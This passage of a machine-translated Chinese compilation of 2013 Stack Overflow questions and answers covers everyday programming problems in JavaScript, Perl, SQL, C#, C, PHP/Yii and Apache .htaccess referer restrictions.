                      [catalogID] => 166
                      [storeID] => 0
                      [categoryID] => 8
                      [parentID] => 7
                      [productID] => 5
                      [the_order] => 1
                      [cat_order] => 1
                      [category] => Brownies
                  )
                )
            ) 
```

任何有助于让我更接近这个结果的帮助表示赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T20:30:06.857

`(SELECT cat2.* FROM ic_store_catalog AS cat2 WHERE cat2.parentid = cat.parentid)`

您应该只替换`cat2.*`一列代表`children`.

# javascript - javascript jquery携带html表单POST数据

> ID：14346224
> 
> 赞同：0
> 
> 时间：2013-01-15T20:25:26.577
> 
> 标签：javascript, jquery

所以我有一个看起来类似于的表格

```
<form action="test.php" id="checksub"  method="post">
  <div>
    <select name="mydropdown">
      <option value="buy">buy</option>
      <option value="sell">sell</option>
    </select>
  </div>

  autocomplete text input that triggers "checksub"

  <input type="submit" id="checksub" name="checksub" style="visibility:hidden">
  <input type="submit" id="newsbutton" name="newsbutton">
</form>

<script type="text/javascript">
  $('#newbutton').click(function() {
    var newaction = "cantfinditems.php";
    $("#checksub").prop("action", newaction);
    $('#checksub').submit();
  });
</script> 
```

现在提交按钮被隐藏了，因为无论如何自动完成都会触发它，但是如果用户找不到他们要找的东西，我想要一个按钮，上面写着“找不到你要找的东西？” 我希望这个按钮对表单操作有不同的操作，即 window.location = cantfinditems.php 但我也想从表单中携带 POST 数据，即“mydropdown”。谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T20:32:35.677

好的，所以你需要第二个按钮，它调用一个 JavaScript 函数。在这个函数中，你做了很多事情：

将表单的 action 属性设置为您的备用操作（例如 cantfinditems.php）

```
var newaction = "cantfinditems.php";
$("#form_id").prop("action", newaction); 
```

提交表格

```
$('#form_id').submit(); 
```

所以一个完整的例子是：

```
<script type="text/javascript">
$('#yourbuttonid').click(function() {
  var newaction = "cantfinditems.php";
  $("#form_id").prop("action", newaction);
  $('#form_id').submit();
});
</script> 
```

# java - 如何在Java中将日期（yyyy-MM-dd）转换为尊重时间顺序的整数值

> ID：14346225
> 
> 赞同：0
> 
> 时间：2013-01-15T20:25:27.733
> 
> 标签：java, function, date

我有一个图，其中一个子集顶点是日期，其他顶点的权重为 0。我想根据其结束顶点日期的权重将整数成本放在边上，这样，iff date(vertex v) < date(vertex w )（即，按时间顺序排列的先前命运），然后权重（v 上的边）< 权重（w 上的边）。Java中有这样的功能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T20:30:05.297

如果您的日期按照您的暗示存储在 yyyy-MM-dd 形式的字符串中，只需使用 String.compareTo() 方法对字符串进行排序。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T20:30:22.893

如果我正确理解了您的问题，您可以使用[getTime](http://docs.oracle.com/javase/1.5.0/docs/api/java/util/Date.html#getTime%28%29)方法（如果您使用 Java`Date`类）来获取毫秒数。这种方法

> 返回自 1970 年 1 月 1 日 00:00:00 GMT 以来此 Date 对象表示的毫秒数。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-15T20:37:07.310

您应该将日期转换为 UTC 毫秒，这会给您一个长值，表示自 1.1.1970 UT 午夜以来的毫秒数。

比如`java.util.Data`有个方法`getTimeStamp()`。

大多数（我认为每个）其他解决方案都有缺点：（字符串需要更多的内存存储，速度较慢，时区问题）。

# perl - perl中如何在数字字符串中添加数字

> ID：14346227
> 
> 赞同：0
> 
> 时间：2013-01-15T20:25:39.300
> 
> 标签：perl

在数字字符串中添加值时遇到一些问题：

我有看起来像的字符串`02:03:05:07:04:06`。所有数字必须小于 10。现在，我必须从 1-9 中取一个随机数，并将该数字与字符串的最后一个位置编号相加（例如 3）。

我总和> 10，然后我将该数字添加到倒数第二个位置的数字中。

到目前为止，我有

```
#!/usr/bin/perl -w
use strict;
my $str='02:03:05:07:04:06';
my @arr=split(/:/,$str);
my @new_arr=pop(@arr);
my $rand_val=int(rand(9));
my $val=$new_arr[0]+$rand_val;
if($val>=10)
{
   I am unable to generate a logic here:(

} 
```

请帮我解决这个问题。

添加数字后，我们必须加入字符串并打印它:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T20:44:01.673

```
my $str = '02:03:05:07:04:06';
my @nums = split /:/, $str;
my $add = int(rand(9)) + 1;
my $overflow = 1;
for (1..@nums) {
   if ($num[-$_] + $add < 10) {
      $num[-$_] += $add;
      $overflow = 0;
      last;
   }
}

die "Overflow" if $overflow;

$str = join ':', map sprintf('%02d', $_), @nums; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T20:51:43.387

这并不能解决您的 rand_val 可能为 0 的问题，但我将把它留给您解决。这应该为您提供您正在寻找的内容，即遍历数组中的值，直到随机值与数组中当前最后一个值的总和。

```
1  use strict;
2  my $str='02:03:05:07:04:06';
3  my @arr=split(/:/,$str);
4  my $rand_val=int(rand(9));
5  my $val;
6 
7  foreach my $i (reverse @arr){
8    $val = $i + $rand_val;
9    next if ($val >= 10);
10   print "val: $val, rand_val: $rand_val, value_used: $i\n";
11   last if ($val < 10);
12 } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-15T20:45:25.423

我只是运行它并且它有效。需要注意的是，字符串的最后一个数字越小，“if ($val>=10)”有效的机会就越小

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-01-15T20:28:37.233

我看到了一个错误：你知道

```
my @new_arr=pop(@arr);
(...)
my $val=$new_arr[0]+$rand_val; 
```

但`pop`只返回最后一个元素，而不是列表。

# jquery - HTML中的图像问题

> ID：14346229
> 
> 赞同：-3
> 
> 时间：2013-01-15T20:25:42.517
> 
> 标签：jquery, html, css

我创建了一个小的 HTML 页面，但发生了一个我以前从未见过的奇怪错误。

在所有图像的右下角，出现了一个白色的小方块。

网址：[http ://squaretise.com/martin-luther-king](http://squaretise.com/martin-luther-king)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T20:29:39.490

是你的`<embed>`标签。尝试隐藏它：

```
<embed src="mlk.mp3" width="0" height="0" style="display:none;" /> 
```

`width`并`height`假设它们的值以像素为单位，所以没有必要放在`px`那里。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T20:29:04.917

默认情况下，您的嵌入 mp3 会生成暂停按钮。

# c++ - 通过函数导出检查 C++ 插件版本

> ID：14346231
> 
> 赞同：1
> 
> 时间：2013-01-15T20:25:58.780
> 
> 标签：c++, plugins, dll, versioning, dllexport

我有两个 DLL，`Core`和`Extension`. `Extension`隐式链接`Core`（使用 Core.lib）。 `Extension`旨在成为可执行文件的插件（显式链接），该可执行文件也隐式链接`Core`.

`Core`声明一个在 Core.dll ( `extern "C" __declspec(dllexport) int GetCoreVersion()`) 中导出的函数，我也想在 Extension.dll 中导出它。

预期目的是比较版本——我希望能够确保插件（扩展）链接到与可执行文件相同的 Core.dll 版本。此检查将在可执行文件中执行，因为它显式链接 Extension.dll（通过`LoadLibrary`和`GetProcAddress`）。有没有更好的办法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T15:57:07.637

我在 Extension 中添加了以下内容，这会导致`GetCoreVersion`符号被导出：

```
#pragma comment(linker, "/export:_GetCoreVersion"); 
```

可执行文件现在能够找到函数（通过`GetProcAddress("GetCoreVersion")`）。

# c# - 在 WP7.5 上与匿名对象绑定

> ID：14346235
> 
> 赞同：1
> 
> 时间：2013-01-15T20:26:10.400
> 
> 标签：c#, silverlight, windows-phone-7, data-binding

在 WP7.5 上，我创建了一个这样的数据上下文：

```
this.DataContext = new { One = listOne, Two = listTwo}; 
```

在我的 XAML 代码中，我尝试了这个：

```
<TextBlock Text="{Binding listOne.m_strTypeTiers}" Style="{StaticResource PhoneTextNormalStyle}" />
<TextBlock Text="{Binding listTwo.m_strTypeTiers}" Style="{StaticResource PhoneTextNormalStyle}" /> 
```

我的文本框是空的。我认为我的绑定语法有错误。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T20:27:48.677

我想你正在寻找`{Binding One.m_strTypeTiers}`

但这取决于 listOne 和 listTwo 是什么。它们是具有名为 m_strTypeTiers 的属性的类吗？如果 m_strTypeTiers 是一个字段，那么您将无法对其进行数据绑定。数据绑定仅适用于属性（[默认情况下](https://stackoverflow.com/a/843051/211627)）。

* * *

**更新**
糟糕。[Silverlight 不支持绑定到匿名类型](https://stackoverflow.com/questions/1569040/silverlight-and-binding-to-anonymous-types)。我正在考虑用于桌面应用程序的 WPF。[Windows Phone 7 使用的 Silverlight](https://stackoverflow.com/a/9390151/211627)非常相似，但在某些重要方面有所不同。我认为您不走运-您将需要定义一个具体的类。

您将来可能会发现这篇文章很有帮助：
[Contrasting Silverlight and WPF](http://msdn.microsoft.com/en-us/library/ff921107%28v=pandp.20%29.aspx)（……并不是说它会帮助您解决这个特定问题）

# mysql - MySQL左加入联合

> ID：14346236
> 
> 赞同：1
> 
> 时间：2013-01-15T20:26:13.340
> 
> 标签：mysql

我正在尝试对工会进行左外部联接。查询运行，但不显示联合中的列。我错过了什么？这是我的查询：

```
SELECT p.profile_record_id, 
       p.first_name, 
       p.last_name, 
       l.entry_id, 
       l.when_logged, 
       l.amount, 
       l.reason_text 
FROM   member_profile p 
       LEFT OUTER JOIN authorize_net_log l 
                    ON ( p.profile_record_id = l.profile_record_id ) 
       LEFT OUTER JOIN (SELECT assigned_entry_number, 
                               payment_status AS e_status, 
                               'vehicle'      AS type, 
                               profile_record_id 
                        FROM   event_entry 
                        UNION 
                        SELECT '', 
                               co_payment_status, 
                               'driver', 
                               profile_record_id 
                        FROM   event_co_driver) u 
                    ON ( p.profile_record_id = u.profile_record_id ) 
WHERE  l.response_code = '1' 
       AND l.reason_code = '1' 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T20:28:42.220

您可能应该将它们添加到`SELECT`列表中：

```
SELECT  u.*, p.profile_record_id, p.first_name, p.last_name, l.entry_id, l.when_logged, l.amount, l.reason_text
FROM    ... 
```

# javascript - 为什么不能将属性添加到空值？

> ID：14346237
> 
> 赞同：1
> 
> 时间：2013-01-15T20:26:16.240
> 
> 标签：javascript, properties, null, typeerror

如果`null`javascript 的值是一个空对象，那么为什么不能向它添加属性呢？下面的代码清除了我的问题：

```
var a = null;

typeof a;
>>> "object"

a.name = 'name';
>>> TypeError: Cannot set property 'name' of null

var a = new Object();

typeof a;
>>> "object"

a.name = 'name';
>>> "name" 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-01-15T20:27:32.667

根据定义，`null`值和`undefined`值都没有任何属性，也不能向它们添加任何属性。

这很好地总结了[null](http://es5.github.com/#x4.3.11)：

> 表示有意不存在任何对象值的原始*值。*

同样，对于[undefined](http://es5.github.com/#x4.3.9)：

> 未为变量赋值时使用的原始值。

(`null`是 Null 类型`undefined`的唯一值，也是 Undefined 类型的唯一值。)

## 现在，对于实现的好处：

这两种类型都表示*基元*，“primitiveValue.Property”的行为由内部 ToObject 方法覆盖。（有关兔子洞的开始，请参阅[GetValue/PutValue](http://es5.github.com/#x8.7.1)。）

从[9.9 开始： ToObject](http://es5.github.com/#x9.9)：

> 抽象操作 ToObject 根据 .. 将其参数转换为 Object 类型的值。

> *   未定义 => 抛出 TypeError 异常。

*   Null =>**抛出 TypeError 异常。**
*   （等等）

至于评论，请参阅[11.4.3：typeOf 运算符](http://es5.github.com/#x11.4.3)：

> 根据 .. 返回由 Type(val) 确定的字符串

> *   未定义 => “未定义”

*   空=> **“对象”**
*   （等等）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T20:29:23.217

`null`是 Javascript 中的一个对象，表示没有对象。您不能将属性添加到任何内容。

另请参阅：[为什么 null 是一个对象以及 null 和 undefined 之间的区别是什么？](https://stackoverflow.com/questions/801032/null-object-in-javascript)

# git - 安装 git hook 直到 npm install

> ID：14346241
> 
> 赞同：1
> 
> 时间：2013-01-15T20:26:32.230
> 
> 标签：git, npm, pre-commit-hook

我有一个项目`package.json`来加载所有开发依赖项。安装项目后，有没有办法安装 git commit hooks `npm install`？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T09:18:16.320

考虑到[npm 项目](https://github.com/isaacs/npm)，[`npm install`](https://npmjs.org/doc/install.html)它本身只会安装/克隆 git repos，还会解释**[脚本部分](https://npmjs.org/doc/scripts.html)**。

```
{ "scripts" :
  { "install" : "scripts/install.js"
  , "postinstall" : "scripts/install.js"
  , "uninstall" : "scripts/uninstall.js"
  }
} 
```

`install`您可以在or步骤中声明一个脚本，该脚本`postinstall`会将您的钩子添加到克隆的存储库中。

# c# - app.xaml 资源字符串中的 XamlParseException

> ID：14346244
> 
> 赞同：2
> 
> 时间：2013-01-15T20:26:39.163
> 
> 标签：c#, wpf, string, xaml, resources

我在 App.xaml 中有以下代码：

```
<Application x:Class="PcgTools.App"
         xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
         xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" 
         xmlns:local="clr-namespace:PcgTools.ViewModels" 
         xmlns:res="clr-namespace:PcgTools.Resources"
         StartupUri="MainWindow.xaml"
         Startup="Application_Startup">
    <Application.Resources>
        <ResourceDictionary>
            ...
            <res:Strings x:Key="LocStrings"/>
        </ResourceDictionary> 
    </Application.Resources>
</Application> 
```

（...是我删除的一些行以使示例更清晰）。

当我运行应用程序时，我收到以下错误（在尝试运行/调试之后直接）：（从荷兰语翻译，所以可能不是 100% 字面上相等）：

在 PcgTools.Resources.Strings 类型中没有找到匹配的构造函数。您可以使用指令 Arguments 或 FactoryMethod 来创建此类型。

文件 Strings.Designer.cs 中有一个构造函数：

```
namespace PcgTools.Resources {
...
public class Strings {
...

[global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute
   ("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
internal Strings() {
    } 
```

但是，它是生成的，所以我什至无法更改它。

顺便说一句，在不更改代码的情况下（大约一周前），但是大约 30% 的时间在调试时它给出了这个错误，并且在再次尝试后这个异常没有发生。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T20:34:11.753

你的`PcgTools.Resources.Strings`类有一个公共的默认构造函数吗？我认为它抱怨它无法创建对象，因为它找不到匹配的构造函数，并且由于您没有使用`Arguments`，它正在寻找一个默认构造函数（一个没有参数的构造函数）。构造函数必须是公共的，而不是内部的或私有的。

由于生成了代码，因此您需要找到一些解决方法。使用 FactoryMethods 可能会起作用。为此，请设置另一个类，例如

```
namespace PcgTools.Resources
{
    public static class StringResourceHelper
    {
        public static strings GetStringResources()
        {
            return new Resources.Strings();
        }
    }
} 
```

然后在您的 XAML 中，您可以执行以下操作：

```
<res:Strings x:FactoryMethod="res:StringResourceHelper.GetStringResources" 
             x:Key="LocStrings"/> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T21:42:09.637

也可以看看：

[http://dotnet.dzone.com/news/did-you-know-silverlight-class](http://dotnet.dzone.com/news/did-you-know-silverlight-class)

简而言之：不要将命名空间命名为 .Resources 它不应该命名为 Resources 而是其他名称，否则您将收到上述错误。

编辑：但是，似乎在更改资源字符串之后，被覆盖的文件（..Designer.cs）仍然包含内部而不是公共构造函数，从而导致问题出现错误。

# php - Yii GetStatus()

> ID：14346248
> 
> 赞同：0
> 
> 时间：2013-01-15T20:26:51.453
> 
> 标签：php, twitter-bootstrap, yii

我的用户模型有 3 个状态选项（活动、已删除、已阻止）。在视图中看到它时，它显示为数字 1、2 或 3。我可以做些什么来通过状态名称显示它？

模型.php

```
const STATUS_ACTIVE = 1;
const STATUS_DELETED = 2;
const STATUS_BLOCKED = 3; 
```

控制器.php

```
public function actionAdmin()
{
    $model=new Users('search');
    $model->unsetAttributes();  // clear any default values
    if(isset($_GET['Users']))
        $model->attributes=$_GET['Users'];

    $this->render('admin',array(
        'model'=>$model,
    ));
} 
```

查看.php

```
<?php $this->widget('bootstrap.widgets.TbGridView',array(
    'type'=>'striped bordered condensed',
    'id'=>'users-grid',
    'dataProvider'=>$model->search(),
    'filter'=>$model,
    'columns'=>array(
        'name',
        'status', // Show 1,2 or 3\. I want to get the status name.
    ),
)); ?> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T20:46:02.527

在您的 User 模型中创建一个名为 getStatusName 的新方法，该方法返回状态名称。这是一种可能的方法：

```
public function getStatusName()
{
    switch($this->status)
    {
        case self::STATUS_ACTIVE:
            return 'Active';
            break;

        case self::STATUS_DELETED:
            return 'Deleted';
            break;

        case self::STATUS_BLOCKED:
            return 'Blocked';
            break;

        default:
            return 'Unknown';
            break;
    }

} 
```

然后在您的 CGridView 中，执行以下操作：

```
<?php $this->widget('bootstrap.widgets.TbGridView',array(
    'type'=>'striped bordered condensed',
    'id'=>'users-grid',
    'dataProvider'=>$model->search(),
    'filter'=>$model,
    'columns'=>array(
        'name',
        'statusName' // And let Yii do its magic OR be explicit
        array('name' => 'status', 'type' => 'text', 'value' => '$data->statusName'),
    ),
)); ?> 
```

注意：如果您在列配置上使用了简短版本，则应将 statusName 添加到您的 attributeLabels 数组

```
//model.php
public function attributeLabels(){
  return array(
    //Other labels
    'statusName' => 'status',
  )
} 
```

这样你也可以在其他地方使用相同的属性，并让它表现得像一个普通的属性（只是它是只读的）。

# php - 带有两个选择 jquery javascript 的动态下拉列表

> ID：14346255
> 
> 赞同：0
> 
> 时间：2013-01-15T20:27:08.453
> 
> 标签：php, jquery, css, ajax, codeigniter

我正在使用 codeigniter 构建一个 Web 应用程序。我从主题森林下载了一个模板。现在我被困在一个没有办法回去开始制作新模板的地方。所以我有两个选择框。我想要的是，如果我选择一个框，结果将出现在第二个选择框上。好吧，我已经完成了这个功能。我遇到的问题是，如果我更改了第二个选择框的 css 类，那么功能将不起作用。

因为我喜欢选择框的设计，所以我不想摆脱 css 类。我想让css和功能都正常工作。我将在我实现功能的地方展示我的 JavaScript 脚本。但主要问题是css。因为 css 类名是这个“cho”，但是当我在浏览器上运行脚本时，它会将类更改为运行时，然后变成“cho chzn-done”。你只能在萤火虫上看到这个。

但是，如果您在查看页面源代码上看到它会看起来“cho”。然后问题是我在任何css或js文件中都找不到“cho”和“cho chzn done”。所以我想要的是在这两个选择框上实现功能。我上传了一个简单的 html 文件。你也可以看看这个。希望你明白我的问题到底是什么。

```
 http://hello.hostingsiteforfree.com/select%20box/myforms.html 
```

如果你想下载它..文件名是select.rar

[http://hello.hostingsiteforfree.com/](http://hello.hostingsiteforfree.com/) 如果有人可以在这些选择框上执行此动态功能，那么我将非常感谢他.. 我不需要任何 JavaScript 或任何 jquery 代码，也不需要你可以从我这里写代码..我只是想看看这个..因为我认为css或jquery文件中的某些地方正在破坏我的价值观。

我的 JavaScript 文件，如果你也需要这个，我将如何捕获这些值......

```
$(document).ready(function () {
  $('#category').change(function () {
    $("#items > option").remove();
    var category_id = $('#category').val();
    $.ajax({
      type: "POST",
      url: "stockInController/get_Items/" + category_id,

      success: function (items) {
        $.each(items, function (item_id, item_name) {
          var opt = $('<option />');
          opt.val(item_id);
          opt.text(item_name);
          $('#items').append(opt);
        });
      }

    });

  });
}); 
```

# c - 许多查找的最佳排序算法

> ID：14346256
> 
> 赞同：0
> 
> 时间：2013-01-15T20:27:16.623
> 
> 标签：c, algorithm, sorting

我需要一些建议来选择一种排序算法来为这个问题编码。

在第一阶段，程序将从数据库中获取客户端 ID 和相应的哈希（可能会使用结构）。可能有 0 条或数千条记录。

在第二阶段，程序将使用从 XML 文件中读取的记录来完成该集合。我已经构建了流解析器。XML 文件在发票数据之前依次包含所有客户信息。

第二阶段完成后，程序将读取发票数据。对于每张发票，都有一个 clientID，这必须从一组客户中进行检查。发票的数量可以是数百万条记录。

我最初的想法。由于我不知道会有多少客户记录，我必须使用链表动态添加内存。在第二阶段结束时，我可以创建一个按 clientID 排序的数据数组，以便我可以执行进一步的搜索，每个发票一个，可以快速检索，也许使用二分搜索。

我想知道你建议我如何处理这种情况。我应该使用什么排序算法？（我将使用 C 进行编码）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T20:30:51.873

可以说，最好的算法是满足以下标准的算法：

*   您不必编写任何代码
*   您不会产生任何第 3 方依赖项
*   对您的目的来说足够快

鉴于数千条记录基本上没有，我建议[`qsort`](http://en.cppreference.com/w/c/algorithm/qsort)用于排序和[`bsearch`](http://en.cppreference.com/w/c/algorithm/bsearch)搜索；这两个都在 C 标准库中。

需要注意的问题：

*   `qsort`不能在链表上使用。我强烈建议将您的数据存储在动态增长的数组中；创建的摊销成本是相同的，并且您将获得其他好处（例如更少的内存开销，更好[*的引用局部性*](http://en.wikipedia.org/wiki/Locality_of_reference)）。

*   如果在仔细分析之后，您发现`bsearch`速度不够快，那么您可能希望转到基于哈希表的查找，因为这是 O(1)，而不是 O(log N)。但是，不要尝试自己编写；为此使用现有的库。（有关建议，请参阅此处的其他答案。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T20:34:21.487

该[`glib`库](http://developer.gnome.org/glib/)包括一个[哈希表实现](http://developer.gnome.org/glib/2.28/glib-Hash-Tables.html)。虽然未排序，但[哈希表](http://en.wikipedia.org/wiki/Hash_table)可以让您进行 O(1) 或[恒定时间查找](http://en.wikipedia.org/wiki/Time_complexity)，如果您要查找数百万张发票，这将非常有用。

还有其他可能性，例如`Client`通过它进行[二进制搜索](http://en.wikipedia.org/wiki/Binary_search)的结构排序数组。假设您的`Client`结构包含一个`unsigned int`名为`clientID`. 如果您的客户 ID 是唯一的且[单调递增](http://en.wikipedia.org/wiki/Monotonic_function)（不一定等同于数组索引，而是递增），并且您有`n`记录，那么您只需转到数据透视索引`floor(n/2)`并查看您的感兴趣 ID`i`大于、等于或小于枢轴索引处的结构引用所引用的 ID，以便决定接下来要查看数组的哪一半。您的新枢轴索引将是该子数组下限和上限的中点，您将递归搜索，直到找到您感兴趣的元素。

通过排序数组进行二分查找的查找性能为 O(log n) — 比哈希表慢，并且排序数组的成本不为零，但总体内存开销可以更小。如果你有足够的内存，哈希表可能会更快，因此对于大量查找来说通常是一个很好的结构。

# javascript - 使用固定参数的自定义顺序柯里化 Javascript 函数

> ID：14346259
> 
> 赞同：1
> 
> 时间：2013-01-15T20:27:26.263
> 
> 标签：javascript, ecmascript-5, partial-application

柯里化函数可能很有用：

```
function tag(name, value) {  
    return '<' + name + '>' + value + '</' + name + '>';
}

var strong = tag.bind(undefined, "strong");
strong("text"); // <strong>text</strong> 
```

现在想象我们必须使用另一个参数顺序错误的函数

```
function otherTag(value, name) {  
    return '<' + name + '>' + value + '</' + name + '>';
} 
```

如何使用 bind 函数获得相同的结果 - 使用 otherTag 函数创建强标签。

如何仅使用**绑定**来咖喱此功能？

* * *

我对基于像这样包装 otherTag 函数的解决方案不感兴趣：

```
wrapOtherTag(name, value) {
    return otherTag(value, name);
} 
```

我想知道是否可以将参数传递给 bind 来告诉我们想要咖喱的参数的顺序。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-05-25T17:37:40.737

编写一个函数来反转参数顺序：

```
function swap(fn) {
    return function(a, b) {
        return fn(b, a); 
    };
} 
```

现在只需打电话

```
swap(otherTag).bind(0, "strong"); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T16:06:03.413

您可以编写自己的函数来完成此操作。

```
// Uncurry `this` in `slice`.
var slice = Function.prototype.call.bind(Array.prototype.slice);

function curry(fn, arg, index) {
    return function curried(/* ...args */) {
        var args = slice(arguments);
        args.splice(index, 0, arg);
        return fn.apply(this, args);
    };
}

var strong = curry(tag, "strong", 0);
strong("text"); // <strong>text</strong>

var otherStrong = curry(otherTag, "strong", 1);
otherStrong("text"); // <strong>text</strong> 
```

# c# - 如何序列化包含接口的不可修改类？

> ID：14346263
> 
> 赞同：3
> 
> 时间：2013-01-15T20:27:38.810
> 
> 标签：c#, serialization, interface, nonserializedattribute

我正在尝试序列化包含接口的对象。但是，接口不能序列化。通常，我会使用[`NonSerialized`](http://msdn.microsoft.com/en-us/library/system.nonserializedattribute.aspx)标签之类的东西，但我不知道如何将此属性应用于我无法修改的类，例如预定义的 .NET 类之一（例如：）[`System.Diagnostics.Process`](http://msdn.microsoft.com/en-us/library/system.diagnostics.process.aspx)。

例如，考虑以下代码：

```
using System.Diagnostics
using System.Xml.Serialization;

class Program
{
    static void Main(string[] args)
    {
        try
        {
            XmlSerializer x = new XmlSerializer(typeof(Process));
        }
        catch (Exception e)
        {
            Console.WriteLine(e.InnerException.InnerException.Message);
        }
    }
} 
```

这将打印以下结果：

```
Cannot serialize member System.ComponentModel.Component.Site of type System.ComponentModel.ISite because it is an interface. 
```

有没有办法**在我无法修改的类中**执行以下任何操作，例如系统类？

1.  在序列化过程中选择性地忽略子元素，这样子元素根本不会被序列化
2.  用完成相同事情的东西标记一个元素`NonSerialized`

I've thought of some solutions like using reflection to dynamically generate a class that contains all the same members as the class to be serialized, doing some type of deep copy, and serializing that. However, I'm curious to see if there is any simpler way to accomplish this serialization task other than going the class generating reflection route.

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-15T20:36:14.640

If serialization of an existing type gets complicated, the best option is **always**: create a separate DTO model - that looks *kinda similar* to your domain entity, but which only exists to play nicely with serialization - usually very simple (parameterless constructors, basic accessors, no validation, etc). Then map between them. Otherwise, you'll be playing a game of whack-a-mole with configuring a serializer for a type it doesn't really like.

If you *want* a game of whack-a-mole with XmlSerializer: you can create an XmlAttributeOverrides instance, configure it by hand for your specific type (adding the attribute instances), and pass it into the XmlSerializer constructor. But this is ugly, quite fiddly, and you **must must must** cache and re-use the serializer instance (the normal automatic assembly cache/re-use doesn't apply if you use that overload of the constructor). You can obtain (from the XmlAttributeOverrides instance) an XmlAttributes instance per-type or per-member, and then the XmlIgnore property to true as necessary. Frankly, I advise against this approach.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T20:37:30.523

Typically you serialize an object that you are implementing yourself which gives you full control in instances like this. I would create a wrapper object that implements ISerializable and in its constructor accepts a Process object. That way, you can control which fields are being serialized yourself.

Having said that, serializing a an executable process does not seem viable. I'd imagine you would want to serialize an object that contains row data that you then consumer over the other end of the wire (at the time of deserialization). The Process class represents a running instance of code in the system, so it seems strange to be wanting to serialize it.

# sql - Pivot SQL 查询中的最后一个非 Null

> ID：14346269
> 
> 赞同：1
> 
> 时间：2013-01-15T20:28:05.327
> 
> 标签：sql, sql-server, sql-server-2008-r2, pivot

我有下表，其中包含数据： ![在此处输入图像描述](../Images/07e455ce16a6798254be122756ed00ce.png)

我有以下 sql 查询来操作数据，使用相同的 unix_timestamp 对所有数据进行分组以使用图形 api（时间线）：

```
select * from 
                (
                    select unix_timestamp, date_time, input_raw, tag_id 
                    from [200030].[dbo].inputs
                    WHERE inputs.date_time > dateadd(day,-1,getdate())
                    AND
                    (tag_id = 92084 OR tag_id = 92106 OR tag_id = 92127 OR tag_id = 92149 OR tag_id = 92164 OR tag_id = 92193 OR tag_id = 92215)
                ) src
                pivot
                (
                    max(input_raw)
                    for tag_id in ([92084], [92106], [92127], [92149], [92164], [92193], [92215])
                ) piv
                ORDER by unix_timestamp DESC 
```

它给了我这些结果（编号的列名来自原始表的 tag_id 字段：

![在此处输入图像描述](../Images/8b79f2d153090302e5532ad34189a216.png)

这是很好的接受，尽管我需要从查询中再做一件事。我需要编号列下的条目是最后一个非 Null 值。除非没有以前的非空值。例如，92149 列下的第 4-8 行需要为 294 而不是 Null。

和建议？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T21:55:34.407

问题本质上是您在时间戳上“丢失”数据，因为一次只有一个标签进入。一种方法是填充缺失的数据。

*此查询获取时间戳和标签的所有组合，然后获取枢轴之前*的最新 input_raw 值。该查询为此使用相关子查询。

```
 select unix_timestamp, date_time, tag_id,
                       coalesce(input_raw,
                                (select top 1 input_raw
                                 from inputs i
                                 where i.tag_id = tags.tag_id and
                                       i.unix_timestamp < tags.unix_timestamp
                                 order by unix_timestamp
                                )
                               ) as input_raw
                from (select 92084 as tag_id union all
                      select 92106 union all select 92127 union all select 92149 union all
                      select 92164 union all select 92193 union all select 92215
                     ) tags cross join
                     (select distinct unix_timestamp, datetime, input_raw
                      from [200030].[dbo].inputs
                      WHERE inputs.date_time > dateadd(day,-1,getdate())
                     ) t left outer join
                     [200030].[dbo].inputs i
                     on i.tag_id = tags.tag_id and
                        i.unix_timestamp = tags.unix_timestamp and
                        i.datetime = tags.datetime
                WHERE inputs.date_time > dateadd(day,-1,getdate()) 
```

这将替换您的内部子查询。

# apache - 如何确保网络流量仅来自特定 URL？

> ID：14346273
> 
> 赞同：0
> 
> 时间：2013-01-15T20:28:14.870
> 
> 标签：apache, security, .htaccess, server-side

我有一个网站 (A)，我想分发给学生。我那里有一些我不想公开的材料，因为这些材料将作为我想出售的未来教科书。

有没有办法确保只有当用户通过另一个站点 (B) 导航到站点 (A)*时才*授予访问权限？

例如，站点 (A)

```
somesite.com/page_to_be_exposed.html 
```

仅当从站点 (B) 导航到时才可见：

```
anothersite.com/somepage.html 
```

我愿意接受*任何*建议，但我认为解决方案可能与我在此处发布的标签有关。如果人们发现需要其他方法/语言，我会添加其他标签。

感谢您的任何建议，这对我来说都是全新的。jml

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T20:33:54.987

您可以使用一个`.htaccess`文件，因为您发现它可能与此有关。

启用`mod_rewrite`了如下规则：

```
RewriteEngine On
RewriteCond %{HTTP_REFERER} !^http://example.com
RewriteRule - - [R=403,L] 
```

在`.htaccess`位于要防止热链接的目录的根目录中的文件中，应该完成这项工作。

